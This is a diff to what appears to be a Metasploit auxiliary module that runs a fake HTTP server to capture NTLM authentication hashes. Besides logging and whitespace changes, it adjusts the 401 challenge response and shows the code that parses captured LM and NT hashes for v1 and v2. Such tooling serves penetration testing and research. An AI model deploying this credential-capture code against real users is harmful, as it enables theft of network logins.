@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -60,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    print_status("Request '#{request.uri}'...")
+    vprint_status("Request '#{request.uri}'")
 
     case request.method
     when 'OPTIONS'
@@ -68,10 +66,16 @@ class Metasploit3 < Msf::Auxiliary
     else
       # If the host has not started auth, send 401 authenticate with only the NTLM option
       if(!request.headers['Authorization'])
+        vprint_status("401 '#{request.uri}'")
         response = create_response(401, "Unauthorized")
         response.headers['WWW-Authenticate'] = "NTLM"
+        response.headers['Proxy-Support'] = 'Session-Based-Authentication'
+        response.body =
+          "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"
+
         cli.send_response(response)
       else
+        vprint_status("Continuing auth '#{request.uri}'")
         method,hash = request.headers['Authorization'].split(/\s+/,2)
         # If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
         if(method != "NTLM")
@@ -144,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
       nt_len = ntlm_hash.length
 
       if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
-        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+        arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
           :lm_hash => lm_hash,
           :nt_hash => ntlm_hash
         }
@@ -155,11 +159,11 @@ class Metasploit3 < Msf::Auxiliary
       #if the length of the ntlm response is not 24 then it will be bigger and represent
       # a ntlmv2 response
       elsif nt_len > 48 #lmv2/ntlmv2
-        arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
-          :lm_hash 		=> lm_hash[0, 32],
-          :lm_cli_challenge 	=> lm_hash[32, 16],
-          :nt_hash 		=> ntlm_hash[0, 32],
-          :nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
+        arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
+          :lm_hash   => lm_hash[0, 32],
+          :lm_cli_challenge  => lm_hash[32, 16],
+          :nt_hash   => ntlm_hash[0, 32],
+          :nt_cli_challenge  => ntlm_hash[32, nt_len  - 32]
         }
       elsif nt_len == 0
         print_status("Empty hash from #{host} captured, ignoring ... ")
@@ -337,7 +341,7 @@ class Metasploit3 < Msf::Auxiliary
         :active => true
       )
       #if(datastore['LOGFILE'])
-      #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
+      #  File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
       #end
 
       if(datastore['CAINPWFILE'] and user)
